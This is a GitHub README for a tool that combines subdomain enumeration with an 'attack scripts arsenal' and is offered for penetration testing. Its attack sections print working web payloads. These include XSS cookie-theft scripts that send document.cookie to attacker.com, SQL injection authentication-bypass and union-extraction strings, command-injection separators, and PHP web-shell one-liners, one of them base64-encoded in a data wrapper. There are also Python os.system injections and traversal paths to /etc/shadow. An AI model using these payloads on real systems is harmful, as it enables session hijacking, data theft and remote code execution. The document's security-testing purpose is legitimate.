# 🐺 Wolf Subdomain Finder & Attack Scripts Arsenal

[![Version](https://img.shields.io/badge/version-2.0-red.svg)](https://github.com/Tamilselvan-S-Cyber-Security)
[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey.svg)](https://github.com/Tamilselvan-S-Cyber-Security)
[![Language](https://img.shields.io/badge/language-HTML%20%7C%20CSS%20%7C%20JavaScript-orange.svg)](https://github.com/Tamilselvan-S-Cyber-Security)

> **The Ultimate Cybersecurity Testing Suite** - A comprehensive collection of subdomain enumeration tools and attack scripts for ethical hacking and penetration testing.

## 🚀 Features Overview

### 🔍 **Subdomain Enumeration Tools**
- **Advanced Subdomain Discovery** - Multiple enumeration techniques
- **DNS Brute Force** - Comprehensive wordlist-based discovery
- **Certificate Transparency** - CT log analysis for subdomain discovery
- **Search Engine Dorking** - Google, Bing, Yahoo dorking techniques
- **GitHub Dorking** - Repository-based subdomain discovery
- **CMS-specific Dorking** - WordPress, Joomla, Drupal enumeration
- **CVE Search Integration** - Vulnerability database integration

### 🚨 **Attack Scripts Arsenal**
- **1000+ Attack Payloads** across 25+ attack types
- **XSS (Cross-Site Scripting)** - Basic, Advanced, Polyglots, Cookie Stealing
- **SQL Injection** - Union, Error-based, Blind, Time-based attacks
- **Remote Code Execution (RCE)** - Command injection, PHP, Python payloads
- **Local File Inclusion (LFI)** - Path traversal, PHP wrappers
- **XXE (XML External Entity)** - File disclosure, SSRF, Blind XXE
- **CSRF (Cross-Site Request Forgery)** - Form-based, JavaScript attacks
- **SSTI (Server-Side Template Injection)** - Jinja2, Twig, Smarty
- **NoSQL Injection** - MongoDB, CouchDB attacks
- **Advanced Polyglots** - Universal multi-context payloads

### 🛠️ **Advanced Features**
- **Payload Generator** - Custom payload creation with encoding
- **Real-time Search** - Search across all attack scripts
- **Bookmark System** - Save favorite payloads
- **Export Functionality** - JSON export of all scripts
- **Usage Statistics** - Track testing activities
- **Responsive Design** - Mobile-friendly interface
- **Dark Theme** - Cybersecurity-focused aesthetics

## 📋 Table of Contents

- [Installation](#-installation)
- [Quick Start](#-quick-start)
- [Subdomain Enumeration](#-subdomain-enumeration)
- [Attack Scripts](#-attack-scripts)
- [Advanced Usage](#-advanced-usage)
- [API Reference](#-api-reference)
- [Contributing](#-contributing)
- [Legal Disclaimer](#-legal-disclaimer)
- [License](#-license)

## 🔧 Installation

### Prerequisites
- Modern web browser (Chrome, Firefox, Safari, Edge)
- Internet connection for external resources
- Local web server (optional, for advanced features)

### Quick Setup
```bash
# Clone the repository
https://github.com/Tamilselvan-S-Cyber-Security/Subdomain_Finder.git

# Navigate to the directory
cd wolf-subdomain-finder

# Open in browser
# Option 1: Direct file access
open index.html

# Option 2: Local server (recommended)
python -m http.server 8000
# Then visit: http://localhost:8000
```

### Docker Setup (Optional)
```bash
# Build Docker image
docker build -t wolf-arsenal .

# Run container
docker run -p 8080:80 wolf-arsenal

# Access at: http://localhost:8080
```

## 🚀 Quick Start

### 1. **Subdomain Enumeration**
```bash
# Open index.html in your browser
# Enter target domain: example.com
# Select enumeration method
# Click "Start Enumeration"
```

### 2. **Attack Scripts Access**
```bash
# Click "🚨 Attack Scripts" in navigation
# Browse categories or use search
# Copy payloads with one click
# Bookmark favorites for quick access
```

### 3. **Payload Generation**
```bash
# Click "🔧 Generator" button
# Select attack type and platform
# Configure encoding options
# Generate custom payloads
```

## 🔍 Subdomain Enumeration

### **Supported Techniques**

#### **1. DNS Brute Force**
- **Wordlists**: 50,000+ subdomains
- **Recursive**: Multi-level subdomain discovery
- **Wildcard Detection**: Automatic wildcard filtering
- **Rate Limiting**: Configurable request throttling

```javascript
// Example usage
const enumerator = new SubdomainEnumerator('example.com');
enumerator.bruteForce({
    wordlist: 'comprehensive',
    threads: 50,
    timeout: 5000
});
```

#### **2. Certificate Transparency**
- **CT Log Sources**: Multiple CT log providers
- **Real-time Monitoring**: Live certificate monitoring
- **Historical Data**: Past certificate analysis
- **Subdomain Extraction**: Automatic SAN parsing

#### **3. Search Engine Dorking**
- **Google Dorking**: 100+ dork patterns
- **Bing Integration**: Alternative search results
- **Yahoo Search**: Additional coverage
- **Custom Dorks**: User-defined patterns

#### **4. GitHub Reconnaissance**
- **Repository Search**: Code-based discovery
- **Commit History**: Historical subdomain analysis
- **Issue Tracking**: Bug report analysis
- **Wiki Scanning**: Documentation review

#### **5. CMS-Specific Enumeration**
- **WordPress**: Plugin/theme enumeration
- **Joomla**: Component discovery
- **Drupal**: Module identification
- **Custom CMS**: Configurable patterns

## 🚨 Attack Scripts

### **XSS (Cross-Site Scripting)**

#### **Basic XSS Payloads**
```html
<!-- Simple Alert -->
<script>alert('XSS')</script>

<!-- Event Handler -->
<img src=x onerror=alert('XSS')>

<!-- JavaScript URL -->
javascript:alert('XSS')
```

#### **Advanced XSS Techniques**
```html
<!-- DOM-based XSS -->
<script>
document.write('<img src=x onerror=alert("XSS")>');
eval('alert("XSS")');
</script>

<!-- Filter Bypass -->
<ScRiPt>alert('XSS')</ScRiPt>
<script>alert(String.fromCharCode(88,83,83))</script>
```

#### **Cookie Stealing**
```html
<!-- Basic Cookie Theft -->
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie
</script>

<!-- Advanced Exfiltration -->
<script>
fetch('http://attacker.com/steal.php', {
    method: 'POST',
    body: JSON.stringify({
        cookies: document.cookie,
        url: window.location.href,
        userAgent: navigator.userAgent
    })
});
</script>
```

### **SQL Injection**

#### **Authentication Bypass**
```sql
-- Basic bypass
' OR '1'='1
' OR 1=1--
') OR ('1'='1

-- Advanced bypass
' OR 1=1 LIMIT 1--
admin'--
admin'/*
```

#### **Union-based Injection**
```sql
-- Basic union
' UNION SELECT 1,2,3--
' UNION SELECT user(),database(),version()--

-- Information extraction
' UNION SELECT table_name,column_name,1 FROM information_schema.columns--
' UNION SELECT schema_name,1,2 FROM information_schema.schemata--
```

#### **Blind SQL Injection**
```sql
-- Boolean-based
' AND (SELECT SUBSTRING(@@version,1,1))='5'--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--

-- Time-based
' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
'; WAITFOR DELAY '0:0:5'--
```

### **Remote Code Execution (RCE)**

#### **Command Injection**
```bash
# Basic separators
; whoami
| whoami
&& whoami
|| whoami

# Encoded payloads
%0a whoami
%0d whoami
```

#### **PHP Code Injection**
```php
<?php system($_GET['cmd']); ?>
<?php exec($_GET['cmd']); ?>
<?php shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
```

#### **Python Code Injection**
```python
__import__('os').system('whoami')
exec("__import__('os').system('whoami')")
eval("__import__('os').system('whoami')")
```

### **Local File Inclusion (LFI)**

#### **Path Traversal**
```bash
# Linux
../../../etc/passwd
../../../etc/shadow
../../../var/log/apache2/access.log

# Windows
..\..\..\..\windows\system32\drivers\etc\hosts
..\..\..\..\windows\win.ini
```

#### **PHP Wrappers**
```php
# Filter wrappers
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php

# Data wrapper
data://text/plain,<?php system($_GET['cmd']); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

# Input wrapper
php://input
[POST DATA: <?php system($_GET['cmd']); ?>]
```

## 🛠️ Advanced Usage

### **Payload Generator**

#### **Custom XSS Generation**
```javascript
// Generate platform-specific XSS
const generator = new PayloadGenerator();
const xssPayload = generator.generate({
    type: 'xss',
    platform: 'php',
    encoding: 'url',
    target: 'http://target.com/vulnerable.php?param='
});
```

#### **SQL Injection Customization**
```javascript
// Database-specific payloads
const sqliPayload = generator.generate({
    type: 'sqli',
    database: 'mysql',
    technique: 'union',
    columns: 3
});
```

### **Bookmark System**
```javascript
// Save favorite payloads
const bookmark = {
    title: 'Advanced XSS Polyglot',
    payload: 'javascript://...',
    category: 'xss',
    tags: ['polyglot', 'bypass', 'waf']
};

bookmarkManager.save(bookmark);
```

### **Export Functionality**
```javascript
// Export all scripts
const exportData = {
    metadata: {
        tool: 'Wolf Attack Scripts Arsenal',
        version: '2.0',
        exported: new Date().toISOString()
    },
    scripts: getAllScripts(),
    bookmarks: getBookmarks(),
    stats: getUsageStats()
};

exportManager.download(exportData, 'json');
```

## 📊 API Reference

### **SubdomainEnumerator Class**
```javascript
class SubdomainEnumerator {
    constructor(domain, options = {}) {
        this.domain = domain;
        this.options = options;
    }
    
    async bruteForce(config) {
        // DNS brute force enumeration
    }
    
    async certificateTransparency() {
        // CT log analysis
    }
    
    async searchEngines() {
        // Search engine dorking
    }
    
    async github() {
        // GitHub reconnaissance
    }
}
```

### **PayloadGenerator Class**
```javascript
class PayloadGenerator {
    generate(config) {
        // Generate custom payloads
    }
    
    encode(payload, encoding) {
        // Apply encoding transformations
    }
    
    validate(payload) {
        // Validate payload syntax
    }
}
```

### **BookmarkManager Class**
```javascript
class BookmarkManager {
    save(bookmark) {
        // Save bookmark to localStorage
    }
    
    load() {
        // Load all bookmarks
    }
    
    export() {
        // Export bookmarks
    }
    
    import(data) {
        // Import bookmarks
    }
}
```

## 🎯 Use Cases

### **Penetration Testing**
- **Reconnaissance Phase**: Subdomain enumeration
- **Vulnerability Assessment**: Attack script testing
- **Exploitation**: Payload generation and deployment
- **Reporting**: Export findings and statistics

### **Bug Bounty Hunting**
- **Asset Discovery**: Comprehensive subdomain mapping
- **Vulnerability Research**: Systematic payload testing
- **Proof of Concept**: Custom exploit development
- **Documentation**: Bookmark and export findings

### **Security Education**
- **Learning Platform**: Hands-on cybersecurity training
- **Payload Analysis**: Understanding attack vectors
- **Defense Strategies**: Recognizing attack patterns
- **Best Practices**: Ethical hacking guidelines

### **Red Team Exercises**
- **Attack Simulation**: Realistic threat scenarios
- **Payload Deployment**: Multi-vector attacks
- **Evasion Techniques**: WAF and filter bypasses
- **Impact Assessment**: Comprehensive testing coverage

## 🔒 Security Features

### **Safe Testing Environment**
- **Payload Validation**: Syntax and structure checking
- **Encoding Options**: Multiple encoding methods
- **Test Mode**: Safe payload testing interface
- **Educational Warnings**: Clear usage guidelines

### **Responsible Disclosure**
- **Authorization Checks**: Permission verification prompts
- **Legal Compliance**: Ethical hacking guidelines
- **Documentation**: Proper testing procedures
- **Reporting Templates**: Structured vulnerability reports

## 📱 Responsive Design

### **Mobile Optimization**
- **Touch-friendly Interface**: Optimized for mobile devices
- **Responsive Layout**: Adaptive design for all screen sizes
- **Gesture Support**: Swipe navigation between categories
- **Mobile Search**: Enhanced search functionality

### **Cross-platform Compatibility**
- **Browser Support**: Chrome, Firefox, Safari, Edge
- **Operating Systems**: Windows, macOS, Linux
- **Device Types**: Desktop, tablet, mobile
- **Performance**: Optimized for all platforms

## ⌨️ Keyboard Shortcuts

| Shortcut | Action |
|----------|--------|
| `Ctrl+F` | Search attack scripts |
| `Ctrl+E` | Export all scripts |
| `Ctrl+G` | Open payload generator |
| `Ctrl+S` | Show statistics |
| `Ctrl+H` | Show help |
| `Ctrl+B` | Toggle bookmarks |
| `Esc` | Clear search |
| `Ctrl+T` | Toggle theme |

## 🎨 Customization

### **Theme Configuration**
```css
/* Custom color scheme */
:root {
    --primary-color: #ff0000;
    --secondary-color: #ffff00;
    --background-color: #000000;
    --text-color: #ffffff;
    --accent-color: #00ff00;
}
```

### **Wordlist Customization**
```javascript
// Add custom wordlists
const customWordlist = [
    'api', 'admin', 'test', 'dev',
    'staging', 'beta', 'demo'
];

enumerator.addWordlist('custom', customWordlist);
```

## 📈 Performance Metrics

### **Enumeration Speed**
- **DNS Queries**: 1000+ queries/minute
- **Concurrent Threads**: Up to 100 threads
- **Response Time**: <5 seconds average
- **Success Rate**: 95%+ accuracy

### **Script Coverage**
- **Total Payloads**: 1000+ attack vectors
- **Attack Types**: 25+ categories
- **Bypass Techniques**: 200+ methods
- **Platform Support**: 50+ technologies

## 🔧 Configuration

### **Environment Variables**
```bash
# API Configuration
WOLF_API_KEY=your_api_key
WOLF_RATE_LIMIT=1000
WOLF_TIMEOUT=30000

# Feature Flags
WOLF_ENABLE_GITHUB=true
WOLF_ENABLE_CT_LOGS=true
WOLF_ENABLE_DORKING=true
```

### **Config File (config.json)**
```json
{
    "enumeration": {
        "threads": 50,
        "timeout": 5000,
        "retries": 3,
        "delay": 100
    },
    "payloads": {
        "encoding": "url",
        "platform": "generic",
        "validation": true
    },
    "ui": {
        "theme": "dark",
        "animations": true,
        "notifications": true
    }
}
```

## 🐛 Troubleshooting

### **Common Issues**

#### **Subdomain Enumeration Not Working**
```bash
# Check DNS resolution
nslookup example.com

# Verify internet connection
ping 8.8.8.8

# Clear browser cache
Ctrl+Shift+Delete
```

#### **Scripts Not Copying**
```javascript
// Check clipboard permissions
navigator.permissions.query({name: 'clipboard-write'})

// Enable HTTPS for clipboard access
// Use local server instead of file:// protocol
```

#### **Performance Issues**
```javascript
// Reduce concurrent threads
config.threads = 25;

// Increase timeout values
config.timeout = 10000;

// Clear browser storage
localStorage.clear();
```

### **Browser Compatibility**
| Browser | Version | Support |
|---------|---------|---------|
| Chrome | 80+ | ✅ Full |
| Firefox | 75+ | ✅ Full |
| Safari | 13+ | ✅ Full |
| Edge | 80+ | ✅ Full |
| IE | Any | ❌ Not supported |

## 📚 Learning Resources

### **Cybersecurity Fundamentals**
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Web Application Security](https://portswigger.net/web-security)
- [Penetration Testing Guide](https://www.offensive-security.com/)

### **Attack Techniques**
- [XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [SQL Injection Defense](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [Command Injection](https://owasp.org/www-community/attacks/Command_Injection)

### **Ethical Hacking**
- [Bug Bounty Methodology](https://github.com/jhaddix/tbhm)
- [Penetration Testing Framework](http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html)
- [Responsible Disclosure](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html)

## 🤝 Contributing

We welcome contributions from the cybersecurity community!

### **How to Contribute**
1. **Fork the repository**
2. **Create a feature branch**
3. **Add your improvements**
4. **Test thoroughly**
5. **Submit a pull request**

### **Contribution Guidelines**
- **Code Quality**: Follow existing code style
- **Documentation**: Update README for new features
- **Testing**: Ensure all features work correctly
- **Security**: No malicious code or backdoors

### **Areas for Contribution**
- **New Attack Vectors**: Additional payload categories
- **Enumeration Techniques**: Novel discovery methods
- **UI Improvements**: Enhanced user experience
- **Performance**: Optimization and speed improvements
- **Documentation**: Tutorials and guides

### **Development Setup**
```bash
# Clone your fork
git clone https://github.com/yourusername/wolf-subdomain-finder.git

# Create feature branch
git checkout -b feature/new-attack-type

# Make changes and test
# ...

# Commit and push
git commit -m "Add new attack type: LDAP injection"
git push origin feature/new-attack-type

# Create pull request
```

## 📄 Legal Disclaimer

### **⚠️ IMPORTANT LEGAL NOTICE**

This tool is designed for **EDUCATIONAL PURPOSES** and **AUTHORIZED SECURITY TESTING** only.

### **Authorized Use Only**
- ✅ **Educational Learning**: Understanding cybersecurity concepts
- ✅ **Authorized Penetration Testing**: With proper written permission
- ✅ **Bug Bounty Programs**: Within program scope and rules
- ✅ **Personal Lab Environment**: Your own systems and networks
- ✅ **Security Research**: Responsible disclosure practices

### **Prohibited Use**
- ❌ **Unauthorized Testing**: Without explicit permission
- ❌ **Malicious Activities**: Illegal hacking or attacks
- ❌ **Data Theft**: Stealing sensitive information
- ❌ **System Damage**: Causing harm to systems or networks
- ❌ **Privacy Violation**: Accessing private data without consent

### **Legal Responsibility**
- **Users are solely responsible** for their actions
- **Obtain proper authorization** before testing any system
- **Follow local laws and regulations** in your jurisdiction
- **Respect privacy and data protection** laws
- **Use for defensive purposes** to improve security

### **Disclaimer of Liability**
The developers of this tool:
- **Do not condone illegal activities** of any kind
- **Are not responsible for misuse** of this software
- **Provide this tool "as is"** without warranties
- **Encourage responsible disclosure** of vulnerabilities
- **Support ethical hacking practices** only

### **Reporting Misuse**
If you discover misuse of this tool, please report it to:
- **Local law enforcement** for illegal activities
- **Tool maintainers** for responsible disclosure
- **Affected organizations** for vulnerability reports

## 📞 Support & Contact

### **Getting Help**
- **Documentation**: Check this README first
- **Issues**: Use GitHub Issues for bug reports
- **Discussions**: Join community discussions
- **Email**: security@wolftools.dev

### **Community**
- **Discord**: [Wolf Security Community](https://discord.gg/wolfsecurity)
- **Twitter**: [@WolfSecTools](https://twitter.com/wolfsectools)
- **LinkedIn**: [Wolf Security](https://linkedin.com/company/wolfsecurity)

### **Professional Services**
- **Penetration Testing**: Professional security assessments
- **Security Training**: Cybersecurity education programs
- **Custom Development**: Tailored security tools
- **Consulting**: Security strategy and implementation

## 📜 License

This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.

### **MIT License Summary**
- ✅ **Commercial Use**: Allowed
- ✅ **Modification**: Allowed
- ✅ **Distribution**: Allowed
- ✅ **Private Use**: Allowed
- ❌ **Liability**: Not provided
- ❌ **Warranty**: Not provided

### **Attribution**
When using this tool, please provide attribution:
```
Wolf Subdomain Finder & Attack Scripts Arsenal
Developed by Tamilselvan
https://github.com/tamilselvan/wolf-subdomain-finder
```

## 🏆 Acknowledgments

### **Special Thanks**
- **OWASP Community**: For security guidelines and best practices
- **Bug Bounty Hunters**: For real-world testing scenarios
- **Security Researchers**: For vulnerability disclosure and research
- **Open Source Contributors**: For code improvements and features

### **Inspiration**
- **Sublist3r**: Subdomain enumeration inspiration
- **SecLists**: Comprehensive wordlists and payloads
- **PayloadsAllTheThings**: Attack payload references
- **OWASP WebGoat**: Educational security platform

### **Tools & Libraries**
- **Bootstrap**: Responsive UI framework
- **jQuery**: JavaScript library
- **Font Awesome**: Icon library
- **Prism.js**: Syntax highlighting

---

<div align="center">

### 🐺 **Wolf Subdomain Finder & Attack Scripts Arsenal**

**The Ultimate Cybersecurity Testing Suite**

[![GitHub Stars](https://img.shields.io/github/stars/Tamilselvan-S-Cyber-Security/Subdomain_Finder?style=social)](https://github.com/Tamilselvan-S-Cyber-Security/Subdomain_Finder/stargazers)
[![GitHub Forks](https://img.shields.io/github/forks/Tamilselvan-S-Cyber-Security/Subdomain_Finder?style=social)](https://github.com/Tamilselvan-S-Cyber-Security/Subdomain_Finder/network/members)
[![GitHub Issues](https://img.shields.io/github/issues/Tamilselvan-S-Cyber-Security/Subdomain_Finder)](https://github.com/Tamilselvan-S-Cyber-Security/Subdomain_Finder/issues)

**Developed with ❤️ by [Tamilselvan](https://github.com/Tamilselvan-S-Cyber-Security)**


</div>

---

**Last Updated**: December 2024  
**Version**: 2.0  
**Status**: Active Development
